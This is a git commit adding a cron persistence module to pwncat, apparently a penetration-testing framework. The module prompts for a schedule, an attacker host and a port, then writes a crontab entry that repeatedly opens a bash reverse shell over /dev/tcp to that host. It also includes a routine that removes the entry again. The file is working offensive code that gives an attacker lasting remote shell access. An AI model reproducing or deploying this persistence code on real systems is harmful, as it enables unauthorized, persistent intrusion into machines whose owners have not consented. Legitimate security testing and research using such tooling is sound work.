0f52f3d5926482afb4d78ab16ff5efaf680f2fca
montysecurity <jacobcainmontgomery@gmail.com>
2020-08-16 18:55:22 -0500

    Added rev shell cron

---
+++ pwncat/persist/cron.py
@@ -0,0 +1,26 @@
+import os, subprocess as sp
+from pwncat import util
+from pwncat.persist import PersistenceMethod, PersistenceError
+from pwncat.util import Access, CompilationError, console
+import pwncat
+
+
+class Method(PersistenceMethod):
+    system = False
+    name = "cron"
+    local = True
+    #Source Begins Here
+    def install(self, user):
+        # Setting Variables for Callback. Cron syntax is not verified
+        # An error in the crontab syntax does not disrupt current crons
+        cron = str(input("Input Cron Scedule: ")).strip()
+        rhost = str(input("LHOST? ")).strip()
+        rport = str(input("LPORT? ")).strip()
+        # Listing all crons and creating a temp file so we can make sure that all currently installed crons stay that way
+        # Bash oneliner using "pwncat" string to differentiate our cron from any existing ones
+        # Installing original list of crons, with the reverse shell added to it 
+        print(str("Calling back to " + rhost + " on a " + cron + " schedule."))
+        os.system("crontab -l 2> /dev/null > /dev/shm/.cron; echo \"" + cron + " echo pwncat && bash -c 'bash -i >& /dev/tcp/" + rhost + "/" + rport + " 0>&1'\" >> /dev/shm/.cron && crontab /dev/shm/.cron && rm /dev/shm/.cron")
+    def remove(self, user):
+        # Using "pwncat" string to remove our crons and reinstalling the original ones
+        os.system("crontab -l | grep -v pwncat > /dev/shm/.cron; crontab /dev/shm/.cron && rm /dev/shm/.cron ")
